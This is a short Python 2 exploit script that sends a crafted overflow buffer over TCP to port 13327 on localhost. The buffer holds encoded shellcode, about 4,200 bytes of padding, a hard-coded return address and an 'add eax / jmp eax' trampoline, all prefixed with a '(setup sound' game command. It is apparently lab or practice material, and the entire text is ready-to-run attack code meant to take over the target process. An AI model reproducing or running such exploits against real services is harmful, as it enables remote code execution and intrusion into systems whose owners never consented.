#!/usr/bin/python
import socket

host = "127.0.0.1"
#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#nasm > 

shellcode = ("\xbb\x38\xdb\x02\xfd\xda\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x14\x31\x58\x14\x03\x58\x14\x83\xc0\x04\xda\x2e\x33\x26\xed"
"\x32\x67\x9b\x42\xdf\x8a\x92\x85\xaf\xed\x69\xc5\x8b\xaf\x23"
"\xad\x29\x50\xd5\x71\x44\x40\x84\xd9\x11\x81\x4c\xbf\x79\x8f"
"\x11\xb6\x3b\x0b\xa1\xcc\x0b\x75\x08\x4c\x28\xca\xf4\x81\x2f"
"\xb9\xa0\x73\x0f\xe6\x9f\x03\x26\x6f\xd8\x6b\x96\xa0\x6b\x03"
"\x80\x91\xe9\xba\x3e\x67\x0e\x6c\xec\xfe\x30\x3c\x19\xcc\x33")
ret = "\x97\x45\x13\x08"
crash = shellcode + "\x41"*(4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[+]Sending evil buffer..."

s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[+]Payload sent"
